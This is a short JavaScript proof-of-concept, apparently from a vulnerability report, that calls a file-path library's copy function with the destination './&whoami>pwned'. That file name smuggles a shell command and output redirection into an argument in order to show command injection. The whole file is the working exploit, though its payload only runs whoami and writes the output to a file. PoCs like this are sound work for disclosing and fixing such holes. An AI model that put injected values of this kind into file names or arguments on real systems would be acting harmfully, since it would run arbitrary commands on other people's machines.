const fspath = require('./src/index');
fspath.copy('./poc.js','./&whoami>pwned', function(err){
    if(err)console.log(err);
    else console.log('ok');
});